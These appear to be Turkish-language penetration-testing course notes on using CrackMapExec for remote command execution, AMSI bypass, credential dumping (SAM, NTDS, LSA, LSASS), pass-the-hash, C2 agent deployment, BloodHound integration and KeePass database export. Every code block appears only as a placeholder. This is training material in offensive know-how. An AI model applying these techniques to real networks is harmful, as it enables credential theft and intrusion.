### Administrator Olarak Komut Yürütme

Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut Yürütme

Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain Hesabı Olarak Komut Yürütme

`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır

{{CODE_BLOCK_153}}


### SMB ile Komut Yürütme

CME'nin dört (4) farklı komut yürütme yöntemi vardır:

| Komut   | Açıklama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |

Not: Her yöntem her bilgisayarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:

### wmiexec aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_155}}


PowerShell seçeneği -X çalıştırıldığında, perde arkasında `CrackMapExec` aşağıdakileri yapacaktır:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Özel AMSI Bypass Çalıştırma

Bu teknikler `PowerShell` çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

*  “Modified Amsi ScanBuffer Patch” içeren dosyayı indirin


### “Modified Amsi ScanBuffer Patch” ile Bir Dosya Oluşturun

{{CODE_BLOCK_156}}


Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor

{{CODE_BLOCK_157}}

* Bu sorunu çözmek için, `shantanukhande-amsi.ps1` dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma

{{CODE_BLOCK_158}}


Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:

### PowerShell Özel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut Yürütme

WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için `administrator` olmasını gerektirmemesidir. `Administrators` grubunun üyesiysek, `Remote Management Users` grubunun üyesiysek veya oturum yapılandırmasında açık `PowerShell Remoting` izinlerimiz varsa WinRM protokolünü kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

| Seçenek           | Açıklama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM bağlantısı için özel bir port seçmek.             |
| --ssl             | SSL etkinleştirilmiş WinRM'ye bağlanmak.                |
| --ignore-ssl-cert | SSL ile bağlanırken sertifika doğrulamasını yok saymak. |

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da `public` ve `private` keyleri kullanmaktır. CrackMapExec, `--key-file` seçeneği ile `private key` kullanımını destekler. Anahtarın çalışması için `OPENSSH` formatında olması gerekir.

### Private Key Kullanarak SSH ile Komut Yürütme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“”)` olarak ayarlamalıyız, aksi takdirde bir hata alırız

Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma

Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.


### SAM

SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.

### Domain Controller üzerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.

### Yalnızca KRBTGT Hesabının Dump Edilmesi

{{CODE_BLOCK_166}}

Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır


### LSA'yı inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile başlayan hash formatı `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse `Hashcat` kullanılarak kırılabilir çünkü bu algoritma `NTLM`'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri `Pas the Hash` saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, `$DCC2$` 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleği, Windows parolalarını `açık metin` olarak veya `NTLM` veya `AES256/AES128` gibi diğer hash biçimlerini içerir. Belleği dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dump'ındaki gerekli baytları remote okumak için `Impacket` projesini ve kimlik bilgilerini çıkarmak için `pypykatz` kullanır.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft `Procdump`'ı ve kimlik bilgilerini çıkarmak için `pypykatz`'ı kullanır.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracı, **LSASS**'e ait kopyalanmış **handle**'ların kullanımını göstererek, aynı **process**'in **gizlenmiş** bir bellek dump'ını oluşturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'ını oluşturan esnek bir araçtır. **LSASS**'e bir **handle** açmak tespit edilebileceğinden, **Nanodump** mevcut **handle**'ları arayabilir. Eğer bir **handle** bulunursa, bunu kopyalayıp **minidump** oluşturmak için kullanır. Ancak, böyle bir **handle** bulunacağının garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bölgesi veya başka bir kaynak** ile etkileşime geçmesini sağlayan **benzersiz bir tanımlayıcıdır**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.

---


### Bir **C2 Framework** içinde **session**'ları alma.

CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir `agent` almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan [kılavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

{{CODE_BLOCK_176}}

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz `empireadmin` kullanıcı adını ve `asdasd123` şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma

{{CODE_BLOCK_177}}

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seçeneğini `empireadmin` kullanıcı adı ve `asdasd123` şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server `1337` portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### İnceleme

{{CODE_BLOCK_179}}


Yapılandırma dosyaları değiştirildikten sonra, Empire client ile Empire sunucusuna bağlanmalıyız

{{CODE_BLOCK_180}}

Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

Artık listener'ımız çalışıyor ve `empire_exec` modülü ile Empire'a bir `agent` almak için CrackMapExec'i kullanabiliriz. Ayarladığımız listener olan `LISTENER=http` seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü `web_delivery` kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve `web_delivery` handler'ını yapılandıralım


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. `URL` ve `PAYLOAD` olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer `x64` kullanıyorsak, `x64` varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. Eğer `32 bit` payload kullanıyorsak `PAYLOAD=32` seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

Başka bir C2 Framework kullanmak istediğimizde, **Command Execution** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **`--no-output`** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. 


### **BloodHound**'da **Owned** olarak işaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için node'a sağ tıklayıp **`Mark X as Owned`** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **`Shortest Path from Owned Principals`** (Ele Geçirilmiş Principal'dan En Kısa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele Geçirilmiş Principal'dan Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir user veya computer'ı BloodHound veritabanında `owned` olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği `bh_enabled`'ı `True` olarak ayarlayın.
* `bh_uri`'yi Bloodhound veritabanı `IP` adresimize ayarlayın.
* `bh_port`'u veritabanı `portuna` ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı `neo4j` ve şifre `asdasd123` (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.

### Bloodhound Verilerinin Toplanması

BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.

### BloodHound verilerinin toplanması

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, `robert` kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.

### Kullanıcı BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.

### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, `--ntds` veya `--lsa` seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak `procdump` veya `lsassy` gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca user'ları Owned olarak işaretlemektedir. Bir `computer` owned olarak işaretlemek istiyorsak, `bh_owned` modülünü ve `neo4j` veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca `PASS` seçeneğini ekleyeceğiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

`get-network` modülü [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'ı  temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, `zone transferine` benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, internal ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. `ALL=true` seçeneğini seçersek, hem IP hem de domain adlarını alır ve `ONLY_HOSTS=true` olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan (Record) Kayıtları Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazının yazıldığı zamanda, modül **`adidnsdump`** aracıyla bazı farklılıklar göstermektedir. Sonuçlar, hesaplar arasında farklılık gösterebilir.


### LDAP Module - laps

Bir başka harika modül de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya `parola sıfırlama` talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için `COMPUTER` seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir wildcard karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır

### LDAP Modülü - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'ü ile temsil edilen ve varsayılan olarak bir **user**'ın bir **domain** içinde oluşturabileceği **computer account** sayısını belirten bir **domain level attribute**'tür.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazı **attack** senaryolarında **domain** içinde bir **machine** oluşturmak gerekebilir, bu yüzden **account machine quota attribute**'ünü **enumerate** etmek önemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla object'in `DACL`'lerini okumamızı ve dışa aktarmamızı sağlayan `daclread`'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabının tüm **ACE**'lerini okumak istiyoruz. Bunun için **`TARGET`** seçeneğini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace Kullanıcısının DACL'sini Oku

{{CODE_BLOCK_203}}


Ayrıca belirli hakları da arayabiliriz, örneğin hangi **principal**'ların **DCSync** haklarına sahip olduğunu. Bunun için **`TARGET_DN`** seçeneğini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seçeneğini seçmemiz ve aramak istediğimiz hakları **`RIGHTS`** seçeneğiyle belirlememiz gerekir.

### DCSync Rights'a Sahip Kullanıcıları Arama

{{CODE_BLOCK_204}}



Çıktıda gösterildiği gibi, `ACE[4]` `robert` kullanıcısının hedef domain'de `DCSync` haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için admin haklarına ( `Pwned!` ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver

Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. `get_netconnections` ve `ioxidresolver` modüllerini kullanalım ve farklarını görelim.

`get_netconnections` modülü, ağ bağlantılarını sorgulamak için `WMI` kullanır. `IPv6` ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module

{{CODE_BLOCK_206}}


Öte yandan, `ioxidresolver` modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül `IPv6` adreslerini içermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal ağlarda adminler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir password manager'dır. Bir master password onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

{{CODE_BLOCK_208}}

Eğer master parolaya sahip değilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın triger sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

*  KeePass yapılandırma dosyasını bulun. Biz bunu `keepass_discover` modülü ile yaptık.
 * `ACTION=ADD` seçeneğini ve `KEEPASS_CONFIG_PATH` öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapılandırma yolu için ters eğik çizgi (`/`) veya çift eğik çizgi (`\`) kullandığınızdan emin olun.

* Kullanıcının KeePass'i açmasını ve master parolayı girmesini bekleyin. Bu işlemi zorlamak için `ACTION=RESTART` seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, `USER=julio` gibi kullanıcı adı ile `USER` seçeneğini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seçeneğini kullanarak export edilen veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seçeneğini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapılandırma dosyasını temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


